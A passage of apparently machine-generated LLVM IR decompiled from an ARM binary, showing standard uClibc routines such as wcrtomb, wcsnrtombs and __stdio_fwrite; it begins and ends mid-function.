dec_label_pc_155c0:                               ; preds = %dec_label_pc_15510.backedge, %dec_label_pc_154dc, %dec_label_pc_155bc, %dec_label_pc_1546c
  %v0_155c0 = load i32, i32* @r6, align 4
  store i32 %v2_15474, i32* %r1.global-to-local, align 4
  store i32 459270, i32* %r2.global-to-local, align 4
  store i32 %v0_154a8, i32* %r3.global-to-local, align 4
  %v4_155d0 = inttoptr i32 %v0_155c0 to i32*
  %v5_155d0 = call i32 @__GI_config_read(i32* %v4_155d0, i32 %v2_15474, i32 459270, i32 %v0_154a8)
  %v2_155d4 = icmp eq i32 %v5_155d0, 0
  br i1 %v2_155d4, label %dec_label_pc_155dc, label %dec_label_pc_154bc

dec_label_pc_155dc:                               ; preds = %dec_label_pc_155c0
  %v0_155dc = load i32, i32* @fp, align 4
  %v7_155dc = icmp eq i32 %v0_155dc, 1
  br i1 %v7_155dc, label %dec_label_pc_155ec, label %dec_label_pc_155e4

dec_label_pc_155e4:                               ; preds = %dec_label_pc_155dc, %dec_label_pc_155b0
  %v0_155e4 = load i32, i32* @r6, align 4
  %v1_155e8 = inttoptr i32 %v0_155e4 to i32*
  %v2_155e8 = call i32 @__GI_config_close(i32* %v1_155e8)
  br label %dec_label_pc_155ec

dec_label_pc_155ec:                               ; preds = %dec_label_pc_154bc, %.thread, %dec_label_pc_155dc, %dec_label_pc_15450, %dec_label_pc_155e4
  %v0_155ec = load i32, i32* @sb, align 4
  store i32 %v3_153f4, i32* @r4, align 4
  store i32 %v9_153f4, i32* @r6, align 4
  store i32 %v12_153f4, i32* @r7, align 4
  store i32 %v15_153f4, i32* @r8, align 4
  store i32 %v18_153f4, i32* @sb, align 4
  store i32 %v24_153f4, i32* @fp, align 4
  ret i32 %v0_155ec

; uselistorder directives
  uselistorder i32 %v0_15510.be, { 1, 0 }
  uselistorder i32 %v0_154a8, { 1, 0 }
  uselistorder i32 %v2_15474, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp9, { 2, 0, 1 }
  uselistorder i32 %tmp7, { 3, 2, 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6, 8, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 5, 6, 7, 8 }
  uselistorder i32* %r1.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 (i32*)* @__GI_config_close, { 1, 0 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_config_read, { 2, 0, 1 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 3, 4, 5, 6, 7, 8, 9, 0, 1, 2 }
  uselistorder i32 -48, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 34, { 6, 5, 7, 8, 9, 1, 2, 0, 4, 10, 3, 11 }
  uselistorder i32* @fp, { 28, 29, 30, 31, 40, 41, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 42, 43, 44, 45, 46, 47, 48, 0, 53, 54, 55, 56, 57, 58, 59, 60, 61, 17, 18, 92, 93, 49, 50, 51, 52, 62, 63, 64, 65, 66, 67, 32, 33, 34, 35, 36, 37, 38, 39, 19, 20, 1, 70, 72, 71, 73, 2, 21, 22, 23, 24, 25, 26, 27, 68, 69, 74, 75, 76, 77, 78, 79, 86, 87, 85, 80, 81, 82, 83, 84, 88, 89, 90, 91, 94, 3 }
  uselistorder label %dec_label_pc_155ec, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_155c0, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_155bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_155b0, { 1, 0 }
  uselistorder label %dec_label_pc_15510.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_154f4, { 1, 0 }
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_1560c = load i32, i32* @lr, align 4
  %v2_15610 = icmp eq i32 %arg1, 0
  br i1 %v2_15610, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_15618 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_15640 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_1562c = phi i32 [ %arg1, %.thread ], [ %v3_15618, %bb ]
  store i32 %arg3, i32* @r4, align 4
  %v2_15628 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_15628, i32* @ip, align 4
  %v2_15630 = ptrtoint i32* %stack_var_-16 to i32
  store i32 16, i32* @r3, align 4
  store i32 %v2_15628, i32* %stack_var_-16, align 4
  store i32 %v0_15640, i32* %stack_var_-12, align 4
  %v5_15648 = inttoptr i32 %v0_1562c to i8*
  %v6_15648 = call i32 @__GI_wcsnrtombs(i8* %v5_15648, i32 %v2_15630, i32 1, i32 16, i32 %arg3)
  %v2_1564c = icmp eq i32 %v6_15648, 0
  br i1 %v2_1564c, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v1_1565c = phi i32 [ %v6_15648, %bb11 ], [ 1, %bb12 ]
  store i32 %v6_1560c, i32* @lr, align 4
  ret i32 %v1_1565c

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_15674 = load i32, i32* @r0, align 4
  %v1_15674 = load i32, i32* @r1, align 4
  %v5_15674 = inttoptr i32 %v0_15674 to i8*
  %v6_15674 = call i32 @__GI_wcsnrtombs(i8* %v5_15674, i32 %v1_15674, i32 -1, i32 %arg1, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_15674

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15684 = load i32, i32* @r4, align 4
  store i32 %v3_15684, i32* %stack_var_-12, align 4
  %v10_15688 = icmp eq i32 %tmp, %arg2
  store i1 %v10_15688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v10_15688, label %dec_label_pc_156a0, label %bb

bb:                                               ; preds = %entry
  %v4_1568c = icmp eq i8* %arg1, null
  store i1 %v4_1568c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %lr.global-to-local, align 4
  br i1 %v4_1568c, label %dec_label_pc_156a0.thread, label %bb39

dec_label_pc_156a0.thread:                        ; preds = %bb
  %v2_15690 = ptrtoint i32* %stack_var_-32 to i32
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb40

bb39:                                             ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

dec_label_pc_156a0:                               ; preds = %entry
  %v2_156901 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v3_156a0 = icmp eq i8* %arg1, null
  store i1 %v3_156a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_156a0, label %bb40, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_156a0
  store i32 %v2_156901, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

bb40:                                             ; preds = %dec_label_pc_156a0, %dec_label_pc_156a0.thread
  %storemerge20 = phi i32 [ %v2_156901, %dec_label_pc_156a0 ], [ %v2_15690, %dec_label_pc_156a0.thread ]
  store i32 %storemerge20, i32* %lr.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %.thread14.thread

.thread14.thread:                                 ; preds = %bb39, %.thread8, %bb40
  %v2_1570428 = phi i32 [ %v2_156901, %.thread8 ], [ %tmp, %bb39 ], [ %storemerge20, %bb40 ]
  %v0_156b8 = load i32, i32* @r3, align 4
  %v3_156b8 = icmp uge i32 %v0_156b8, %arg3
  %arg3.v0_156b8 = select i1 %v3_156b8, i32 %arg3, i32 %v0_156b8
  store i32 %arg3.v0_156b8, i32* %r5.global-to-local, align 4
  %v1_156c4 = inttoptr i32 %arg2 to i32*
  %v2_156c4 = load i32, i32* %v1_156c4, align 4
  store i32 %v2_156c4, i32* %r2.global-to-local, align 4
  store i32 %arg3.v0_156b8, i32* %r0.global-to-local, align 4
  %v2_1571822 = icmp eq i32 %arg3.v0_156b8, 0
  store i1 %v2_1571822, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1571822, label %dec_label_pc_15720, label %dec_label_pc_156d0

dec_label_pc_156d0:                               ; preds = %.thread14.thread, %dec_label_pc_15710.dec_label_pc_156d0_crit_edge
  %v2_15704 = phi i32 [ %v2_15710, %dec_label_pc_15710.dec_label_pc_156d0_crit_edge ], [ %v2_1570428, %.thread14.thread ]
  %v0_156dc = phi i32 [ %v0_156d0.pre, %dec_label_pc_15710.dec_label_pc_156d0_crit_edge ], [ %v2_156c4, %.thread14.thread ]
  %v1_156d0 = inttoptr i32 %v0_156dc to i32*
  %v2_156d0 = load i32, i32* %v1_156d0, align 4
  %v7_156d4 = icmp eq i32 %v2_156d0, 127
  store i1 %v7_156d4, i1* %cpsr_z.global-to-local, align 1
  %v1_156d8 = urem i32 %v2_156d0, 256
  store i32 %v1_156d8, i32* @ip, align 4
  %v1_156dc = add i32 %v0_156dc, 4
  store i32 %v1_156dc, i32* %r2.global-to-local, align 4
  %tmp45 = icmp ult i32 %v2_156d0, 128
  br i1 %tmp45, label %dec_label_pc_15700, label %dec_label_pc_156e4

dec_label_pc_156e4:                               ; preds = %dec_label_pc_156d0
  store i32 ptrtoint (i32* @global_var_cbfc.568 to i32), i32* %r2.global-to-local, align 4
  %v0_156e8 = call i32 @__aeabi_read_tp()
  store i32 %v0_156e8, i32* %r0.global-to-local, align 4
  %v3_156ec = load i16, i16* @global_var_222f0.75, align 2
  %v4_156ec = sext i16 %v3_156ec to i32
  store i32 %v4_156ec, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_156f8 = add i32 %v4_156ec, %v0_156e8
  %v4_156f8 = inttoptr i32 %v3_156f8 to i32*
  store i32 84, i32* %v4_156f8, align 4
  %v0_1572c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1572c

dec_label_pc_15700:                               ; preds = %dec_label_pc_156d0
  %v2_15700 = icmp eq i32 %v1_156d8, 0
  store i1 %v2_15700, i1* %cpsr_z.global-to-local, align 1
  %v1_15704 = trunc i32 %v2_156d0 to i8
  %v3_15704 = inttoptr i32 %v2_15704 to i8*
  store i8 %v1_15704, i8* %v3_15704, align 1
  %v0_15708 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15708, label %.dec_label_pc_15720_crit_edge, label %dec_label_pc_15710

dec_label_pc_15710:                               ; preds = %dec_label_pc_15700
  %v0_15710 = load i32, i32* %lr.global-to-local, align 4
  %v1_15710 = load i32, i32* %r4.global-to-local, align 4
  %v2_15710 = add i32 %v1_15710, %v0_15710
  store i32 %v2_15710, i32* %lr.global-to-local, align 4
  %v0_15714 = load i32, i32* %r0.global-to-local, align 4
  %v1_15714 = add i32 %v0_15714, -1
  store i32 %v1_15714, i32* %r0.global-to-local, align 4
  %v2_15718 = icmp eq i32 %v1_15714, 0
  store i1 %v2_15718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15718, label %dec_label_pc_15720, label %dec_label_pc_15710.dec_label_pc_156d0_crit_edge

dec_label_pc_15710.dec_label_pc_156d0_crit_edge:  ; preds = %dec_label_pc_15710
  %v0_156d0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_156d0

.dec_label_pc_15720_crit_edge:                    ; preds = %dec_label_pc_15700
  %v1_15708 = load i32, i32* @ip, align 4
  store i32 %v1_15708, i32* %r2.global-to-local, align 4
  %v0_15720.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_15720

dec_label_pc_15720:                               ; preds = %dec_label_pc_15710, %.dec_label_pc_15720_crit_edge, %.thread14.thread
  %v0_15720 = phi i32 [ %v0_15720.pre, %.dec_label_pc_15720_crit_edge ], [ %v2_1570428, %.thread14.thread ], [ %v2_15710, %dec_label_pc_15710 ]
  %v1_15720 = load i32, i32* @sp, align 4
  %v9_15720 = icmp eq i32 %v0_15720, %v1_15720
  store i1 %v9_15720, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15720, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_15720
  %v1_15724 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_15724, i32* %v1_156c4, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_15720, %bb43
  %v0_15728 = load i32, i32* %r0.global-to-local, align 4
  %v1_15728 = load i32, i32* %r5.global-to-local, align 4
  %v2_15728 = sub i32 %v1_15728, %v0_15728
  store i32 %v2_15728, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1572c

dec_label_pc_1572c:                               ; preds = %dec_label_pc_156e4, %bb44
  %v0_1572c = phi i32 [ %v0_1572c.pre, %dec_label_pc_156e4 ], [ %v2_15728, %bb44 ]
  store i32 %v0_1572c, i32* %r0.global-to-local, align 4
  %v2_15734 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15734, i32* %r4.global-to-local, align 4
  ret i32 %v0_1572c

; uselistorder directives
  uselistorder i32 %v0_1572c, { 1, 0 }
  uselistorder i32 %v1_15714, { 1, 0 }
  uselistorder i32 %v2_15710, { 0, 2, 1 }
  uselistorder i32 %v1_156d8, { 1, 0 }
  uselistorder i32 %v2_156d0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_1570428, { 1, 0 }
  uselistorder i32 %v2_156901, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 6, 1, 4, 2, 3, 5, 7, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 6, 0 }
  uselistorder i32* %lr.global-to-local, { 4, 0, 3, 5, 1, 6, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 4, 1, 2, 3, 8, 5, 9, 6, 7 }
  uselistorder i32* @sp, { 2, 3, 0, 1 }
  uselistorder i32 84, { 3, 4, 5, 0, 1, 6, 8, 7, 9, 2, 10, 11, 12, 14, 13, 15, 16, 17 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1572c, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_15720, { 1, 0, 2 }
  uselistorder label %dec_label_pc_156d0, { 1, 0 }
  uselistorder label %.thread14.thread, { 2, 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg3 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_15740 = load i32, i32* @r4, align 4
  store i32 %v3_15740, i32* %stack_var_-20, align 4
  %v6_15740 = load i32, i32* @r5, align 4
  %v9_15740 = load i32, i32* @r6, align 4
  %v12_15740 = load i32, i32* @r7, align 4
  %v3_15744 = load i16, i16* %arg3, align 2
  %v4_15744 = zext i16 %v3_15744 to i32
  store i32 %v4_15744, i32* @r3, align 4
  %v1_15748 = and i32 %v4_15744, 512
  store i32 %v1_15748, i32* @r4, align 4
  %v2_15748 = icmp eq i32 %v1_15748, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_15748, label %dec_label_pc_15760, label %dec_label_pc_1585c

dec_label_pc_15760:                               ; preds = %entry
  %v2_15760 = add i32 %tmp, 4
  %v3_15760 = inttoptr i32 %v2_15760 to i32*
  %v4_15760 = load i32, i32* %v3_15760, align 4
  %v2_15768 = add i32 %tmp, 16
  %v3_15768 = inttoptr i32 %v2_15768 to i32*
  %v4_15768 = load i32, i32* %v3_15768, align 4
  store i32 %v4_15768, i32* @r0, align 4
  %v2_1576c = add i32 %tmp, 12
  %v3_1576c = inttoptr i32 %v2_1576c to i32*
  %v4_1576c = load i32, i32* %v3_1576c, align 4
  store i32 %v4_1576c, i32* @r3, align 4
  %v4_15770 = icmp eq i32 %v4_15760, -2
  %v2_15774 = sub i32 %v4_1576c, %v4_15768
  br i1 %v4_15770, label %dec_label_pc_15774, label %dec_label_pc_1579c

dec_label_pc_15774:                               ; preds = %dec_label_pc_15760
  %v3_15778 = icmp ugt i32 %v2_15774, %arg2
  br i1 %v3_15778, label %bb, label %bb12

bb:                                               ; preds = %dec_label_pc_15774
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_15774, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_15774, %dec_label_pc_15774 ]
  %v0_15780 = phi i32 [ %arg2, %bb ], [ %v2_15774, %dec_label_pc_15774 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_15780, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_15788 = call i32 @memcpy()
  %v0_1578c = load i32, i32* @r5, align 4
  %v1_1578c = add i32 %v0_1578c, 16
  %v2_1578c = inttoptr i32 %v1_1578c to i32*
  %v3_1578c = load i32, i32* %v2_1578c, align 4
  %v1_15790 = load i32, i32* @r4, align 4
  %v2_15790 = add i32 %v1_15790, %v3_1578c
  store i32 %v2_15790, i32* %v2_1578c, align 4
  br label %dec_label_pc_15870

dec_label_pc_1579c:                               ; preds = %dec_label_pc_15760
  store i32 %v2_15774, i32* @r3, align 4
  %tmp18 = icmp ult i32 %v2_15774, %arg2
  br i1 %tmp18, label %dec_label_pc_1583c, label %dec_label_pc_157a8

dec_label_pc_157a8:                               ; preds = %dec_label_pc_1579c
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_157b0 = call i32 @memcpy()
  %v0_157b4 = load i32, i32* @r5, align 4
  %v1_157b4 = add i32 %v0_157b4, 16
  %v2_157b4 = inttoptr i32 %v1_157b4 to i32*
  %v3_157b4 = load i32, i32* %v2_157b4, align 4
  %v1_157b8 = inttoptr i32 %v0_157b4 to i16*
  %v2_157b8 = load i16, i16* %v1_157b8, align 2
  %v1_157bc = load i32, i32* @r6, align 4
  %v2_157bc = add i32 %v1_157bc, %v3_157b4
  %v1_157c0 = and i16 %v2_157b8, 256
  %v2_157c0 = icmp eq i16 %v1_157c0, 0
  store i32 %v2_157bc, i32* %v2_157b4, align 4
  br i1 %v2_157c0, label %dec_label_pc_15870, label %dec_label_pc_157cc

dec_label_pc_157cc:                               ; preds = %dec_label_pc_157a8
  %v0_157cc = load i32, i32* @r7, align 4
  %v0_157d4 = load i32, i32* @r6, align 4
  %v4_157d8 = call i32 @memrchr(i32 %v0_157cc, i32 10, i32 %v0_157d4, i32 %v2_157bc)
  %v2_157dc = icmp eq i32 %v4_157d8, 0
  br i1 %v2_157dc, label %dec_label_pc_15870, label %dec_label_pc_157e4

dec_label_pc_157e4:                               ; preds = %dec_label_pc_157cc
  %v0_157e4 = load i32, i32* @r5, align 4
  store i32 %v0_157e4, i32* @r0, align 4
  %v0_157e8 = call i32 @__stdio_wcommit()
  %v2_157ec = icmp eq i32 %v0_157e8, 0
  br i1 %v2_157ec, label %dec_label_pc_15870, label %dec_label_pc_157f4

dec_label_pc_157f4:                               ; preds = %dec_label_pc_157e4
  %v1_157f4 = load i32, i32* @r6, align 4
  %v3_157f4 = icmp uge i32 %v0_157e8, %v1_157f4
  %v1_157f4.v0_157e8 = select i1 %v3_157f4, i32 %v1_157f4, i32 %v0_157e8
  store i32 %v1_157f4.v0_157e8, i32* @r4, align 4
  %v2_15800 = sub i32 %v1_157f4, %v1_157f4.v0_157e8
  %v0_15804 = load i32, i32* @r7, align 4
  %v2_15804 = add i32 %v0_15804, %v2_15800
  store i32 %v2_15804, i32* %r7.global-to-local, align 4
  store i32 %v2_15804, i32* @r0, align 4
  store i32 %v1_157f4.v0_157e8, i32* @r2, align 4
  %v4_15814 = call i32 @__GI_memchr(i32 %v2_15804, i32 10, i32 %v1_157f4.v0_157e8, i32 %v2_15800)
  %v2_15818 = icmp eq i32 %v4_15814, 0
  br i1 %v2_15818, label %dec_label_pc_15870, label %dec_label_pc_15820

dec_label_pc_15820:                               ; preds = %dec_label_pc_157f4
  %v0_15820 = load i32, i32* @r5, align 4
  %v1_15820 = add i32 %v0_15820, 16
  %v2_15820 = inttoptr i32 %v1_15820 to i32*
  %v3_15820 = load i32, i32* %v2_15820, align 4
  %v0_15824 = load i32, i32* %r7.global-to-local, align 4
  %v1_15824 = load i32, i32* @r4, align 4
  %v2_15824 = sub i32 %v0_15824, %v4_15814
  %v2_15828 = add i32 %v2_15824, %v1_15824
  %v2_1582c = sub i32 %v3_15820, %v2_15828
  %v1_15830 = load i32, i32* @r6, align 4
  %v2_15830 = sub i32 %v1_15830, %v2_15828
  store i32 %v2_15830, i32* @r6, align 4
  store i32 %v2_1582c, i32* %v2_15820, align 4
  br label %dec_label_pc_15870

dec_label_pc_1583c:                               ; preds = %dec_label_pc_1579c
  %v2_1583c = add i32 %tmp, 8
  %v3_1583c = inttoptr i32 %v2_1583c to i32*
  %v4_1583c = load i32, i32* %v3_1583c, align 4
  store i32 %v4_1583c, i32* @r3, align 4
  %v9_15840 = icmp eq i32 %v4_15768, %v4_1583c
  br i1 %v9_15840, label %dec_label_pc_1585c, label %dec_label_pc_15848

dec_label_pc_15848:                               ; preds = %dec_label_pc_1583c
  store i32 %tmp, i32* @r0, align 4
  %v0_1584c = call i32 @__stdio_wcommit()
  %v2_15850 = icmp eq i32 %v0_1584c, 0
  br i1 %v2_15850, label %dec_label_pc_15848.dec_label_pc_1585c_crit_edge, label %bb15

dec_label_pc_15848.dec_label_pc_1585c_crit_edge:  ; preds = %dec_label_pc_15848
  %v0_1585c.pre = load i32, i32* @r6, align 4
  %v0_15860.pre = load i32, i32* @r5, align 4
  %v0_15864.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1585c

bb15:                                             ; preds = %dec_label_pc_15848
  %v1_15854 = load i32, i32* @r4, align 4
  store i32 %v1_15854, i32* @r6, align 4
  br label %dec_label_pc_15870

dec_label_pc_1585c:                               ; preds = %dec_label_pc_15848.dec_label_pc_1585c_crit_edge, %entry, %dec_label_pc_1583c
  %v0_15864 = phi i32 [ %v0_15864.pre, %dec_label_pc_15848.dec_label_pc_1585c_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_1583c ]
  %v0_15860 = phi i32 [ %v0_15860.pre, %dec_label_pc_15848.dec_label_pc_1585c_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_1583c ]
  %v0_1585c = phi i32 [ %v0_1585c.pre, %dec_label_pc_15848.dec_label_pc_1585c_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_1583c ]
  %v1_15860 = inttoptr i32 %v0_15860 to i16*
  %v5_15868 = call i32 @__stdio_WRITE(i16* %v1_15860, i32 %v0_15864, i32 %v0_1585c)
  store i32 %v5_15868, i32* @r6, align 4
  br label %dec_label_pc_15870

dec_label_pc_15870:                               ; preds = %bb15, %dec_label_pc_157f4, %dec_label_pc_157e4, %dec_label_pc_157cc, %dec_label_pc_157a8, %dec_label_pc_15820, %bb12, %dec_label_pc_1585c
  %v0_15870 = load i32, i32* @r6, align 4
  %v2_15878 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_15878, i32* @r4, align 4
  store i32 %v6_15740, i32* @r5, align 4
  store i32 %v9_15740, i32* @r6, align 4
  store i32 %v12_15740, i32* @r7, align 4
  ret i32 %v0_15870

; uselistorder directives
  uselistorder i32 %v2_15828, { 1, 0 }
  uselistorder i32 %v2_15800, { 1, 0 }
  uselistorder i32 %v1_157f4.v0_157e8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_157f4, { 1, 0, 2 }
  uselistorder i32 %v2_15774, { 2, 4, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_15870, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_1585c, { 0, 2, 1 }
  uselistorder label %bb12, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15880 = load i32, i32* @r4, align 4
  store i32 %v3_15880, i32* %stack_var_-8, align 4
  %v3_15884 = load i16, i16* %arg1, align 2
  %v4_15884 = zext i16 %v3_15884 to i32
  %v2_15888 = and i32 %v4_15884, %arg2
  %v4_15888 = icmp eq i32 %v2_15888, 0
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_15888, label %dec_label_pc_15894, label %dec_label_pc_158a4

dec_label_pc_15894:                               ; preds = %entry
  %v1_15894 = and i32 %v4_15884, 2176
  %v2_15894 = icmp eq i32 %v1_15894, 0
  br i1 %v2_15894, label %dec_label_pc_1589c, label %dec_label_pc_158b0

dec_label_pc_1589c:                               ; preds = %dec_label_pc_15894
  %v2_1589c = or i32 %v4_15884, %arg2
  %v1_158a0 = trunc i32 %v2_1589c to i16
  store i16 %v1_158a0, i16* %arg1, align 2
  %v0_158a4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_158a4

dec_label_pc_158a4:                               ; preds = %entry, %dec_label_pc_1589c
  %v0_158e8 = phi i32 [ %tmp, %entry ], [ %v0_158a4.pre, %dec_label_pc_1589c ]
  %v1_158a4 = inttoptr i32 %v0_158e8 to i16*
  %v2_158a4 = load i16, i16* %v1_158a4, align 2
  %v3_158a4 = zext i16 %v2_158a4 to i32
  store i32 %v3_158a4, i32* @ip, align 4
  %v1_158a8 = and i32 %v3_158a4, 32
  %v2_158a8 = icmp eq i32 %v1_158a8, 0
  br i1 %v2_158a8, label %dec_label_pc_158d8, label %dec_label_pc_158b0

dec_label_pc_158b0:                               ; preds = %dec_label_pc_15894, %dec_label_pc_158a4
  %v0_158b4 = call i32 @__aeabi_read_tp()
  store i32 %v0_158b4, i32* %r0.global-to-local, align 4
  %v3_158b8 = load i16, i16* @global_var_222f0.75, align 2
  %v4_158b8 = sext i16 %v3_158b8 to i32
  store i32 9, i32* %r2.global-to-local, align 4
  %v3_158c0 = add i32 %v4_158b8, %v0_158b4
  %v4_158c0 = inttoptr i32 %v3_158c0 to i32*
  store i32 9, i32* %v4_158c0, align 4
  br label %dec_label_pc_158c4

dec_label_pc_158c4:                               ; preds = %dec_label_pc_15900, %dec_label_pc_158b0
  %v0_158c4 = load i32, i32* @r4, align 4
  %v1_158c4 = inttoptr i32 %v0_158c4 to i16*
  %v2_158c4 = load i16, i16* %v1_158c4, align 2
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_158cc = or i16 %v2_158c4, 8
  store i16 %v1_158cc, i16* %v1_158c4, align 2
  br label %bb11

dec_label_pc_158d8:                               ; preds = %dec_label_pc_158a4
  %tmp14 = urem i16 %v2_158a4, 4
  %v2_158d8 = icmp eq i16 %tmp14, 0
  br i1 %v2_158d8, label %dec_label_pc_15934, label %dec_label_pc_158e0

dec_label_pc_158e0:                               ; preds = %dec_label_pc_158d8
  %v1_158e0 = and i32 %v3_158a4, 4
  store i32 %v1_158e0, i32* @r1, align 4
  %v2_158e0 = icmp eq i32 %v1_158e0, 0
  br i1 %v2_158e0, label %dec_label_pc_158e8, label %dec_label_pc_15918

dec_label_pc_158e8:                               ; preds = %dec_label_pc_158e0
  %v1_158e8 = add i32 %v0_158e8, 20
  %v2_158e8 = inttoptr i32 %v1_158e8 to i32*
  %v3_158e8 = load i32, i32* %v2_158e8, align 4
  store i32 %v3_158e8, i32* %r2.global-to-local, align 4
  %v1_158ec = add i32 %v0_158e8, 16
  %v2_158ec = inttoptr i32 %v1_158ec to i32*
  %v3_158ec = load i32, i32* %v2_158ec, align 4
  %v9_158f0 = icmp eq i32 %v3_158e8, %v3_158ec
  br i1 %v9_158f0, label %dec_label_pc_158f8, label %dec_label_pc_15900

dec_label_pc_158f8:                               ; preds = %dec_label_pc_158e8
